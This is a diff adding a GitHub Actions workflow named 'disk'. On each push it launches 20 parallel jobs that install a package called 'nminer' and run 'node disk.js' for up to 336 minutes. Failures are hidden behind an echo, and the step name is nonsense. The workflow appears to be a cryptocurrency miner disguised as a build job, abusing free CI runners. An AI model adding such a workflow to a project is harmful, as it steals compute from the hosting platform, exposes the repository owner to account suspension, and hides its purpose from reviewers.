@@ -1,0 +1,45 @@
+name: disk
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5271 }
+          - { version: 2260 }
+          - { version: 8027 }
+          - { version: 6394 }
+          - { version: 2708 }
+          - { version: 3047 }
+          - { version: 612 }
+          - { version: 7015 }
+          - { version: 3525 }
+          - { version: 3524 }
+          - { version: 4321 }
+          - { version: 3552 }
+          - { version: 6168 }
+          - { version: 4467 }
+          - { version: 229 }
+          - { version: 8969 }
+          - { version: 5588 }
+          - { version: 1294 }
+          - { version: 4216 }
+          - { version: 5795 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: shred supposing um
+        run: |
+          npm install nminer@latest
+          timeout 336m node disk.js || echo "disk executed"
